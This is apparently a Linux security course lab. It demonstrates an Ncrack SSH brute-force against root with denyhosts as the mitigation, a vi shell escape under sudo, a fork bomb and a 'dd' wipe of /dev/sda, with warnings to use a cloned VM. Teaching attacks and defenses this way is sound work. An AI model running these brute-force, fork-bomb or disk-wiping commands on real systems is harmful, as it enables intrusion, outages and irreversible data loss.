# **Lab 07:** Analyze and Differentiate Types of Attacks and Mitigations Techniques

## **Bruteforcing SSH**

### **Demonstrate Using Ncrack Against denyhosts**

**From Target's Machine**
- Open Terminal
- Verify that the SSH service is running
```
~$ ps -eaf | grep -v grep | grep sshd
```
- Verify that the service **denyhosts** is not running
```
~$ service denyhosts status
```
- Based on the denyhosts.conf file, check to see where it places denied hosts.
```
~$ sudo grep HOSTS_DENY /etc/denyhosts.conf | grep -v "#"
```
**From Threat Actor's Machine**
- Open Terminal
- Test SSH connection to the target system
```
~$ ssh name@ipaddress "uptime"
```
**From Target's Machine**
- Open Terminal
- Grep the log entry recorded from the SSH connection that was initiated by the threat actor.
```
~$ grep “Accepted password” /var/log/auth.log | grep “Attacker'sIP”
```
**From Threat Actor's Machine**
- Open Terminal
- Initiate the Ncrack tool against target's SSH service, using a predefined password list.
```
~$ ncrack –v Target's IP -- user root –P /tmp/wordlists/passlist –p ssh
```
**From Target's Machine**
- Open Terminal
- Start the denyhosts script
```
~$ sudo service denyhosts start
```
**From Threat Actor's Machine**
- Open Terminal
- Attempt to SSH to the target's system with the credentials gained from the Ncrack tool
```
~$ ssh name@Target'sIP
```
- Might notice now how the connection is being automatically closed by the remote system.
- If so, determine if the IP address is being blocked or if SSH traffic is being blocked.
```
~$ telnet Target'sIP 22
```
- Noticing the output, we can determine that the IP address is being blocked since the remote host is still listening on port 22

**From Target's Machine**
- Open Terminal
- View the contents of the **hosts.denyfile**
- Notice that the file is populated with the IPaddress belonging to the Threat Actor's system. 
- It can be concluded that the denyhosts service has blocked Attacker’s IP address based on its attempt to force itself an SSH connection with the remote system.
- Analyze the auth.log file for failed password attempts (case sensitive).
```
~$ grep “Failed password” /var/log/auth.log | grep “203.0.113.2”
```
- Notice the failed attempts created by the Ncrack application.

### **Unblock Threat Actor's IP**

**From Target's Machine**
- To remove the blocked entry from the hosts.deny file, temporarily stop the rsyslogservice.
```
~$ sudo service rsyslog stop
```
- Stop the denyhosts service.
```
~$ sudo service denyhosts stop
```
- Edit the hosts.deny file by removing the Attacker's IP entry.
```
~$ sudo nano /etc/hosts.deny
```
- Use your arrows keys to navigate to the IP entry and press Backspace to erase the entire line: “sshd: Attacker's IP”
- Once modified, press CTRL+X to exit.
- When asked to save modified buffer, press the Ykey for Yes.
- Press Enter to confirm the filename as /etc/hosts.deny

## **Dangerous Linux Commands**

### **Exploiting sudo with vi Editor**

- Escalate to root privileges.
```
~$ sudo su
```
- Create and edit the hacksrus.txt file**
```
~$ vi hacksrus.txt
```
- Once in the **vi** editor, type the command below.
```
:!/bin/sh
```
- The input is recorded at the bottom of the **vi** editor.
- Press Enter.
- After the command is entered, you’ll be presented with the ‘ # ‘ prompt.
- Type *id* followed by pressing the Enter key.
- This command will print the current user
- Notice that you are running a shell as root.
- Type whoami to confirm you are the user root. Press Enter.
- Type exitfollowed by pressing the Enter key to close the shell.
- Press the Enterkey once more.
- Notice the prompt returns to the **vi** editor, type the command below followed by pressing the Enter key to quit.
```
:q!
```
- While in the terminal, type the command below to analyze the log file showing privileges being escalated to root.
```
~$ grep sudo /var/log/auth.log | tail -l
```
## **Demonstrate DOS Attack**
### **Warning:** Do not attempt this section of the lab on a personal computer.  It will cause serious harm to a machine, resulting in an inoperable state.
- ### **Be sure to clone your Virtual Machine before continuing.**

### **From Virtual Machine**
- Monitor live CPU and memory usage within a terminal window. Enter:
```
~$ htop
```
- Open a new terminal window
- Make sure to arrange the display of the new terminal window where you can see both terminals side-by-side.
- In the new terminal window, type the command below to initiate a “fork bomb” attack on the VM. 
```
~$ :(){ :|: & };:
```
- Watch closely at the terminal window with **htop** running.
- After 3-4 minutes, notice how the CPU usage spikes, reaching almost 100% while both memory and swap memory are spiking as well.
- What is happening here is that the Virtual Machine is running out of memory by forking a process infinitely.
- In other words, it is making multiple copies of itself that is setting off a chain reaction resulting in quickly exhausting the system’s resources.
- Because the system is overwhelmed, the **htop** application may be slow and unresponsive.
- Keep an eye on the Uptime value and see whether it is incrementing. If it is not, it is unresponsive. You may proceed to the next step.
- When you are finished analyzing the “fork bomb” operation, shutdown the Virtual Machine.

## **Destroying the HDD with dd**
### **Warning:**  Do not attempt this section of the lab on a personal computer. It will cause serious harm to a machine resulting, in an inoperable state. 
- ### **Be sure to clone your Virtual Machine before continuing.**

### **From Virtual Machine**
- Open a terminal
- Run **iotop** to actively monitor disk I/O activity
```
~$ sudo iotop
```
- Open another new terminal window.
- Position both terminal windows so that both can be viewed at the same time.
- Type the command below to mimic an HDD attack if a threat actor had access to a physical machine within a network infrastructure.
```
~$ sudo dd if=/dev/zero of=/dev/sda
```
- Notice on the Terminal running **iotop**, a heavy I/O activity is taking place.
- Wait 1-3 minutes until the system crashes.
- Power down VM
- Power on VM
- Wait 1-3 minutes until a message appears showing that no operating system is available.
- The **dd** command has been successful in such a way that the damage has been done.
- The command process kept writing random zeros on the partition *sda* to the point where it can no longer function because of the overwritten files.
